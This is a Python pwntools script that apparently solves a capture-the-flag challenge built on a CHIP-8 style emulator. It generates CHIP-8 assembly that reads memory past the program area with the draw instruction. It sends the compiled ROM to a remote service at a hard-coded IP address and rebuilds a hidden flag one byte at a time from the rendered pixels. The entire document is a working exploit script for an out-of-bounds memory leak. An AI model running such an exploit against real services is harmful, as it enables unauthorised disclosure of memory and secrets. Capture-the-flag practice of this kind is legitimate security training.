from pwn import *
import os

ip = "51.254.39.184"
port = 1337

flag = ""

def retrieve_flag_shellcode(index):
    gened_shellcode = """CLS
XOR V0,V0
XOR V1,V1
ADD V0,%i
LD I,0xfff
ADD I,V0
XOR V1,V1
XOR V0,V0
DRW V0,V1,1
RET
""" % index
    return gened_shellcode


for i in range(17, 48+16, 1):


    with open("solve.asm", "w") as solve:
        solve.write(retrieve_flag_shellcode(i))

    os.system("python .\compiler.py solve.asm")

    with open("shellcode.rom", "rb") as tg:
        shellcode = tg.read()
    p = remote(ip, port)
    p.recvuntil(b"Enter ROM code: ")
    p.sendline(shellcode)
    p.recv()
    p.sendline(b"A"*0x10)
    leak = b""
    while True:
        leak = p.recv()
        if b"\xe2\x96\x80" in leak:
            break
    

    leak = leak.split(b"\n")
    leak = leak[2].replace(b"\xe2\x96\x80", b"1").decode()[1:][:8]
    for x in leak:
        if x != "1":
            leak = leak.replace(x, "0")
    char_leaked = chr(int("0b%s" % leak, 2))
    print("char_leaked: %s" % char_leaked)
    flag += char_leaked
    
    p.close()

print("[+] Found flag: %s" % flag)
